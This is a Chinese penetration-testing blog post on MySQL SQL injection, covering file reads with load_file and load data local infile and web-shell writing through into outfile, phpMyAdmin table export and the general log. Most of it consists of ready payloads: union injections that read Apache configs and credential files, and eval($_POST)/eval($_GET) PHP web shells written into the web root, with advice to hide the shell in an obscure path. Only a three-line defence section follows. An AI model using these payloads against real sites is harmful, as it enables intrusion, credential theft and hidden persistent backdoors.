---
draft: false
date: 2016-06-20 08:10:27
title: SQL 注入之 load_file 和 into outfile(MySQL)
description: 
categories:
  - Pentest
tags:
  - SQL注入
  - getshell
---

### 0x00 load_file() 读文件
* 条件:

```
1. 要有file_priv权限: show global variables like '%secure%';
2. 知道文件绝对路径
3. 能使用union
4. 对web目录有读权限  
注：若过滤了单引号，则可以将函数中的字符进行hex编码
```

* 一般步骤
    * 读/etc/init.d下的东西，这里有配置文件路径
    ```
    ?id=1' union select 1,2,load_file('/etc/init.d/httpd')
    ```

    * 得到web安装路径  
    ```
    ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')
    ```

    * 读取密码文件
    ```  
    ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')
    ```

### 0x01 load data local infile 读文件
* 条件:

```
MySQL8 中需要 SET GLOBAL local_infile=1;
```

* 语句

```
LOAD DATA LOCAL INFILE 'D:/pet.txt' INTO TABLE pet FIELDS TERMINATED BY '';
select * from pet;
```

### 0x02 into outfile getshell
* 条件：

```
1. 要有file_priv权限  
2. 知道网站绝对路径  
3. 要能用union  
4. 对web目录有写权限  
5. 没有过滤单引号
```

* 一般方法  
当知道路径时，可以直接用

```
id=1 union select "<? phpinfo();>" into outfile("C:/phpStudy/WWW/a.php")

id=1 into outfile 'C:/phpStudy/WWW/a.php' columns terminated by '<? phpinfo();>';
id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '<? phpinfo();>';
id=1 into outfile 'C:/phpStudy/WWW/a.php' lines terminated by '<? phpinfo();>';
id=1 into outfile 'C:/phpStudy/WWW/a.php' lines starting by '<? phpinfo();>';
```

* phpMyAdmin 导出数据 getshell 

登陆phpMyAdmin  
```
use test;  选择数据库为test
create table aaa(bbb varchar(64));   在数据库中创建一个表aaa
insert into aaa values("<?php @eval($_POST['c']);?>"); --在 aaa 中写入 shell 内容
select * from aaa into outfile 'C:/phpStudy/WWW/a.php'; --将 aaa 中的数据导出到文件 a.php
```

localhost:80/a.php能访问  
```
drop aaa; --删除建立的表
```

然后菜刀连接  
```ini
菜刀连接http://www.aa.com/a.php，然后更改shell的名字并将shell放在较隐蔽的地方，比如C:\phpStudy\WWW\phpMyAdmin\setup\lib\common.php
```

* phpMyAdmin 日志 getshell

```
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'C:/phpStudy/WWW/a.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式
```

### 0x03 防御
* 数据库连接账号不要用root权限
* php关闭报错模式
* mysql账户没有权限向网站目录写文件